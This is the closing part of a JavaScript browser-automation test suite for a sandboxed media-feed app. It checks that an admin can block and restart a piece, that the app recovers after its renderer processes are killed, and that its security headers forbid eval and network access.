  check('a fresh page load does not start it', await until(() => p2.ev(`!!slides.find(s=>s.v.id===${JSON.stringify(first)}).el.querySelector('.stall')`), 4000));
  await p2.close();
  check('an admin can restart it', await call('DELETE', `api/admin/blocked/${first}`) === 200);
  await p.ev(`EigenReelAPI.readBlocked()`);
  check('the list is empty again', (await fetch(`${SERVER}/api/blocked`).then(x => x.json())).items.length === 0);
  check('the piece comes back in a browser that had stopped it', await until(() => p.ev(`(()=>{ const s=slides[activeIdx]; return !s.el.querySelector('.stall') && !!s.el.querySelector('iframe[sandbox]') && s.host && s.host.state==='running'; })()`), 5000));
  await p.close();
}

/* ---------- a crashed tab ---------- */
async function crash() {
  console.log('\nA crashed tab, as static files:');
  const p = await open(`${STATIC}/`);
  await until(() => p.ev(`typeof slides!=='undefined' && !!document.querySelector('.stage iframe[sandbox]')`));
  await sleep(800);
  const first = await p.ev(`slides[activeIdx].v.id`);
  if (verbose) console.error('journal', await p.ev(`sessionStorage.getItem('eigenreel:mounting')`));
  // a real crash: kill the renderer processes (every other tab is closed by now). Page.crash leaves this headless tab
  // wedged; a killed renderer leaves it as a crashed tab would, with its sessionStorage, ready to load again.
  const procs = await browserCall('SystemInfo.getProcessInfo');
  const renderers = (procs.result?.processInfo || []).filter(x => x.type === 'renderer').map(x => x.id);
  for (const pid of renderers) try { process.kill(pid, 'SIGKILL'); } catch { }
  if (verbose) console.error('killed renderers', renderers);
  await sleep(1500);
  await p.attach(true);
  await p.go(`${STATIC}/`);
  if (verbose) console.error('after', await p.ev(`[sessionStorage.getItem('eigenreel:mounting'),sessionStorage.getItem('eigenreel:crashed')]`));
  const r = await until(() => p.ev(`(()=>{ if(typeof slides==='undefined'||!slides.length) return null; const s=slides.find(x=>x.v.id===${JSON.stringify(first)}), c=s&&s.el.querySelector('.stall'); return c?{text:c.textContent, retry:!!c.querySelector('[data-act="restart"]')}:null; })()`), 8000);
  check('the piece is skipped on reload, with a way to try again', r && /skipped/.test(r.text) && r.retry, r);
  await p.shot('crashed');
  if (r) {
    await p.ev(`slides.find(x=>x.v.id===${JSON.stringify(first)}).el.querySelector('[data-act="restart"]').click()`);
    check('Try again runs it', await until(() => p.ev(`(()=>{ const s=slides.find(x=>x.v.id===${JSON.stringify(first)}); return !s.el.querySelector('.stall') && !!s.el.querySelector('iframe[sandbox]'); })()`), 5000));
  }
  await p.ev(`location.reload()`).catch(() => {}); await sleep(1500);
  check('a clean reload blames nothing', await until(() => p.ev(`typeof EigenReelHost==='object' && !EigenReelHost.isCrashed(${JSON.stringify(first)})`), 4000));
  await p.close();
}

/* ---------- headers ---------- */
async function headers() {
  console.log('\nHeaders, on the server:');
  const page = (await fetch(`${SERVER}/`)).headers.get('content-security-policy');
  check('the page has no eval, no blob: scripts and no images from other servers', !/unsafe-eval'/.test(page.replace("'wasm-unsafe-eval'", '')) && !/script-src[^;]*blob:/.test(page) && !/img-src[^;]*https:/.test(page), page);
  const run = await fetch(`${SERVER}/runner.html`);
  const rc = run.headers.get('content-security-policy');
  check('runner.html is sandboxed by header, with no network and no eval', /sandbox allow-scripts/.test(rc) && /connect-src 'none'/.test(rc) && !/unsafe-eval'/.test(rc.replace("'wasm-unsafe-eval'", '')), rc);
}

const only = opt('--only'), want = n => !only || only.split(',').includes(n); // --only attacks,explanations,registry,catalog,fonts,kill,crash,headers
try {
  if (want('headers')) await headers();
  if (want('attacks')) await attacks(SERVER, 'on the server', `${SERVER}/api/me/kv`);
  if (want('attacks')) await attacks(STATIC, 'as static files', `${STATIC}/private.json`);
  if (want('explanations')) await explanations(SERVER, 'on the server');
  if (want('explanations')) await explanations(STATIC, 'as static files');
  if (want('registry')) await registryFuzz();
  if (want('catalog')) await catalog(SERVER, 'on the server');
  if (want('catalog')) await catalog(STATIC, 'as static files');
  if (want('fonts')) await fonts(SERVER);
  if (want('kill')) await killSwitch();
  if (want('crash')) await crash();
} catch (e) { console.error(e); cleanup(); process.exit(2); }
console.log(`\n${total - failed} of ${total} checks passed.`);
cleanup();
process.exit(failed ? 1 : 0);
